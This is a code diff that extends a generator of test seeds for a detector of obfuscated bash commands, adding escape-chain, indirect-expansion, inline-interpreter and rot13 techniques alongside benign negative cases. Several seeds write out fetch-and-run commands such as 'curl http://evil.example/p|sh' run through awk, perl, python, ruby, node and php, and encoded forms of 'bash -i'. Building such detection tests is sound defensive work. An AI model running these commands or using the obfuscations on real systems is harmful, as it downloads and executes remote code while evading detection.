@@ -24,6 +24,16 @@ const BASH_TECHNIQUE_CATALOG = Object.freeze([
   'Bash Variable Concatenation',
   'Bash Variable Concatenation (partial)',
   'Bash /dev/tcp Reverse Shell',
+  'Bash echo -e Escape Chain',
+  'Bash Indirect Variable Expansion',
+  'Bash Inline awk Executor',
+  'Bash Inline perl Executor',
+  'Bash Inline python Executor',
+  'Bash Inline python3 Executor',
+  'Bash Inline ruby Executor',
+  'Bash Inline node Executor',
+  'Bash Inline php Executor',
+  'Bash tr rot13 Here-String',
 ]);
 
 function makeRng(seed) {
@@ -266,6 +276,118 @@ function genDevTcp() {
   ];
 }
 
+function genEchoEEscapeChain() {
+  // B7 — `echo -e '\xNN…'` / `echo -e '\NNN…'`. Decoder decodes the
+  // escape run and gates against SENSITIVE_BASH_KEYWORDS.
+  const out = [];
+  // Hex form spelling "whoami".
+  out.push(makeSeed(
+    "echo -e '\\x77\\x68\\x6f\\x61\\x6d\\x69'",
+    'whoami',
+  ));
+  // Mixed `-ne` flag, octal form spelling "curl".
+  out.push(makeSeed(
+    "echo -ne '\\143\\165\\162\\154 http://x'",
+    'curl',
+  ));
+  // `-e` only, UPPER form, spelling "bash -i".
+  out.push(makeSeed(
+    "echo -E '\\x62\\x61\\x73\\x68 -i'",
+    'bash',
+  ));
+  return out;
+}
+
+function genIndirectExpansion() {
+  // B8 — ${!pointer} two-hop resolution. Decoder requires (a) pointer
+  // value is a valid identifier and (b) final value hits SENSITIVE list.
+  const out = [];
+  out.push(makeSeed(
+    'a=whoami\nb=a\neval "${!b}"',
+    'whoami',
+  ));
+  out.push(makeSeed(
+    'cmd=curl\nptr=cmd\n${!ptr} http://evil.example/p',
+    'curl',
+  ));
+  // Should NOT match: pointer value is not a valid identifier.
+  out.push(makeSeed(
+    'a=not valid\nb=a\n${!b}',
+    '',
+  ));
+  return out;
+}
+
+function genInlineInterpreter() {
+  // B9 — awk/perl/python/ruby/node/php inline executors. Decoder
+  // surfaces the inline body when it contains a system/exec-shaped
+  // call (or falls through to SENSITIVE_BASH_KEYWORDS).
+  const out = [];
+  out.push(makeSeed(
+    `awk 'BEGIN{system("curl http://evil.example/p|sh")}'`,
+    'curl',
+  ));
+  out.push(makeSeed(
+    `perl -e 'system("wget http://evil.example/p -O- | bash")'`,
+    'wget',
+  ));
+  out.push(makeSeed(
+    `python -c 'import os; os.system("curl http://evil.example/p|sh")'`,
+    'os.system',
+  ));
+  out.push(makeSeed(
+    `python3 -c "import subprocess; subprocess.call(['bash','-c','curl http://x|sh'])"`,
+    'subprocess',
+  ));
+  out.push(makeSeed(
+    `ruby -e 'exec("curl http://evil.example/p|sh")'`,
+    'curl',
+  ));
+  out.push(makeSeed(
+    `node -e 'require("child_process").exec("curl http://evil.example/p|sh")'`,
+    'child_process',
+  ));
+  out.push(makeSeed(
+    `php -r 'system("curl http://evil.example/p|sh");'`,
+    'curl',
+  ));
+  // Benign build-script form — SHOULD NOT fire (no exec-intent).
+  out.push(makeSeed(
+    `awk -e '{print $2}'`,
+    '',
+  ));
+  return out;
+}
+
+function genTrRot13() {
+  // B10 — tr rot13 here-string. Only the two canonical rot13 set pairs
+  // resolve; arbitrary translate-sets are ignored.
+  const out = [];
+  // rot13('whoami') = 'jubnzv' — wait, rot13('whoami'): w→j, h→u, o→b,
+  // a→n, m→z, i→v → 'jubnzv'. Seed the cipher-input so decoding yields
+  // the SENSITIVE keyword.
+  out.push(makeSeed(
+    `tr 'A-Za-z' 'N-ZA-Mn-za-m' <<< 'jubnzv'`,
+    'whoami',
+  ));
+  // Reverse orientation: same table read N-Z first.
+  out.push(makeSeed(
+    `tr 'N-ZA-Mn-za-m' 'A-Za-z' <<< 'phey'`,
+    'curl',
+  ));
+  // Lowercase-first set form. rot13('bash -i') handles non-alpha too.
+  out.push(makeSeed(
+    `tr 'a-zA-Z' 'n-za-mN-ZA-M' <<< 'onfu -v'`,
+    'bash',
+  ));
+  // Arbitrary set — decoder MUST ignore.
+  out.push(makeSeed(
+    `tr 'abc' 'xyz' <<< 'abcabc'`,
+    '',
+  ));
+  return out;
+}
+
 function generateBashSeeds() {
   const rng = makeRng(0xBA55BA55);
   void rng; // reserved for future parameter sweeps
@@ -277,6 +399,10 @@ function generateBashSeeds() {
     ...genEvalUnroll(),
     ...genIfsAndConcat(),
     ...genDevTcp(),
+    ...genEchoEEscapeChain(),
+    ...genIndirectExpansion(),
+    ...genInlineInterpreter(),
+    ...genTrRot13(),
   ];
 }
 
